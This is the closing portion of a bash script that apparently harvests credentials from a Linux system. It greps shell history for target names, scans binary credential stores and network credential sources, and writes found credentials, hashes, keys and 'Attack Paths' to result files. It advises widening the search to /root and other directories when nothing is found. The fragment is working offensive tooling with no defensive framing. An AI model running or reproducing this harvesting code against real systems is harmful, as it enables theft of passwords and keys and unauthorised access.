                done <<< "$hits"
            fi

            # Also grep for target names in history
            for t in "${TARGETS[@]}"; do
                local thits; thits=$(grep -nE "\b${t}\b" "$hf" 2>/dev/null)
                [[ -z "$thits" ]] && continue
                while IFS= read -r hit; do
                    [[ -z "$hit" ]] && continue
                    local ln="${hit%%:*}" cmd="${hit#*:}"
                    cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
                    [[ ${#cmd} -gt 120 ]] && cmd="${cmd:0:117}..."
                    clear_progress
                    printf "[%s] ${Y}%-10s${RST} ${W}→${RST}  ${DIM}%s${RST}   ${DIM}%s${RST}\n" \
                        "$(ts)" "$t" "$cmd" "${hf}:${ln}"
                    rwrite "history.txt" "$(printf '%-12s → %s   (%s:%s)' "$t" "$cmd" "$hf" "$ln")"
                done <<< "$thits"
            done
        done
    fi

    # ── Binary credential stores ───────────────────────────────────────────────
    [[ $QUIET -eq 0 ]] && printf "\r\033[K  ${DIM}scanning binary stores…${RST}" >&2
    scan_binary_stores
    clear_progress

    # ── Network / system credential sources ───────────────────────────────────
    [[ $QUIET -eq 0 ]] && printf "\r\033[K  ${DIM}scanning network cred sources…${RST}" >&2
    scan_network_creds
    clear_progress

    # ── Done ──────────────────────────────────────────────────────────────────
    end_progress

    local end_time duration
    end_time=$(date +%s); duration=$((end_time - start_time))
    local total=$(( ${#ALL_CREDS[@]} + ${#ALL_HASHES[@]} + ${#ALL_KEYS[@]} ))

    echo ""
    echo -e "${G}Task Completed${RST} ${DIM}| ${duration}s | ${FILES_SCANNED} files | ${FOUND_COUNT} credentials found${RST}"
    echo -e " ${DIM}→ ${RESULTS_DIR}/${RST}"
    echo ""

    # ── Write summary ──────────────────────────────────────────────────────────
    rwrite "00-summary.txt" ""
    rwrite "00-summary.txt" "── Attack Paths ────────────────────────────────────────────"
    local i=1; local -A sp
    for p in "${ATTACK_PATHS[@]}"; do
        [[ -z "${sp[$p]+x}" ]] && { sp[$p]=1; rwrite "00-summary.txt" "  ${i}. ${p}"; i=$((i+1)); }
    done
    rwrite "00-summary.txt" ""
    rwrite "00-summary.txt" "── Stats ───────────────────────────────────────────────────"
    rwrite "00-summary.txt" "  Duration: ${duration}s | Files: ${FILES_SCANNED} | Credentials: ${FOUND_COUNT}"

    if [[ $FOUND_COUNT -eq 0 ]]; then
        echo -e "  ${Y}No credentials found.${RST}"
        echo -e "  ${DIM}Tips: check permissions, try -d /root+home+etc+opt, use -H for history${RST}"
        echo ""
    fi
}

main
